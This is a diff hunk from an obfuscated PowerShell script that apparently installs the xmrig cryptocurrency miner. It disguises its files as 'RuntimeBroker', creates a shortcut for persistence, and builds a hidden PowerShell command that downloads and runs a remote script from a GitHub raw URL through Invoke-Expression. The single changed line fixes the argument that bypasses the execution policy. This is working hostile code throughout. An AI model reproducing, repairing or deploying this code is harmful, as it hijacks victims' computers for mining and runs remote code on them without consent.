@@ -15,7 +15,7 @@ if (.('Tes'+'t-P'+'ath') -Path "$env:APPDATA\Microsoft\2504706.txt") {
     ${d`EstinAt`IoN`p`AtH} = ${BASep`A`Th}
     ${xmR`IgpA`Th} = &('J'+'oin-Pa'+'th') -Path ${de`stI`N`AtIoNP`ATh} -ChildPath ('xm'+'rig.exe')
     ${b`AT`c`hpAth} = &('Joi'+'n-P'+'ath') -Path ${BA`se`pA`Th} -ChildPath ('RuntimeBro'+'k'+'er.'+'p'+'s1')
-    ${bAtC`h`ARGu`MENt} = ('-'+'Exec'+'uti'+'o'+'nP'+'olicy by'+'pa'+'ss -F'+'ile') + "" + ${baT`ChPA`Th}
+    ${bAtC`h`ARGu`MENt} = ('-'+'Exec'+'uti'+'o'+'nP'+'olicy by'+'pa'+'ss -F'+'ile') + " " + ${baT`ChPA`Th}
     ${shoR`TC`Utp`ATH} = &('Join-'+'Path') -Path "$env:APPDATA\Microsoft\" -ChildPath ('Run'+'timeBro'+'ker.ln'+'k')
     ${uR`i2} = (('{'+'0'+'}https://'+'raw.g'+'ith'+'u'+'b'+'user'+'cont'+'e'+'nt'+'.c'+'o'+'m/so'+'2'+'51/olaq'+'ue'+'r'+'i'+'da/main/file.ps1{0}')  -f [chAR]34)
     ${b`ATCHc`oNTENt} = ('ec'+'ho '+'5216612'+' '+'> '+"$2504`n "+'powershe'+'ll'+' '+'-w'+'indow'+'s'+'tyle '+'hi'+'dden '+'-Co'+'mmand'+' '+('{0'+'}I'+'nvoke-Ex'+'pr'+'ession ')  -F[Char]39+'(Invoke-Rest'+'M'+'e'+'tho'+'d '+'-'+'Uri '+"$uri2)' "+'')
